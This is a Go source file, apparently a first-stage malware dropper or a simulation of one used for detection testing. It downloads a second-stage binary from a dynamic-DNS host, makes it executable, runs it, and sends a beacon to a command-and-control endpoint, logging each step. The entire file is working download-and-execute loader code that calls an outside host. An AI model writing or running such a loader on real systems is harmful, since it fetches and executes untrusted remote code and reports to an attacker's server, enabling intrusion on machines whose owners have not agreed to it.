package main

import (
	"os"
	"os/exec"
	"time"
)

func main() {
	const host = "lacework.ddns.net"
	//const host = "localhost:8080"
	const filename = "lw-stage-2"
	const postUrl = "http://" + host + "/lw-beacon"
	const getUrl = "http://" + host + "/bin/" + filename
	var body = []byte(`{"stage":"1"}`)

	Log := setupLogger("lw-stage-1.log")

	// wait a few seconds
	time.Sleep(3 * time.Second)

	// download second stage file
	Log.Println("Downloading stage 2...")
	getErr := httpGet(getUrl, filename)
	if getErr != nil {
		Log.Println("Error downloading 2nd stage", getErr)
		panic(getErr)
	}

	// make file executable
	chmodErr := os.Chmod(filename, 0777)
	if chmodErr != nil {
		Log.Println("Error changing permissions", chmodErr)
		panic(chmodErr)
	}

	//wait a few seconds
	time.Sleep(3 * time.Second)

	// get current path
	path, pathErr := os.Getwd()
	if pathErr != nil {
		panic(pathErr)
	}

	// execute second stage binary
	Log.Println("Executing stage 2...")
	command := exec.Command(path + "/" + filename)
	execErr := command.Start()
	if execErr != nil {
		Log.Println("Error starting stage 2", execErr)
		panic(execErr)
	}

	//wait a few seconds
	time.Sleep(3 * time.Second)

	//beacon to C2 once
	Log.Println("Beaconing to C2 once...")
	postErr := httpPost(postUrl, body)
	if postErr != nil {
		Log.Println("Error posting beacon to API", postErr)
		panic(postErr)
	}

	Log.Println("Completed. Terminating.")
}
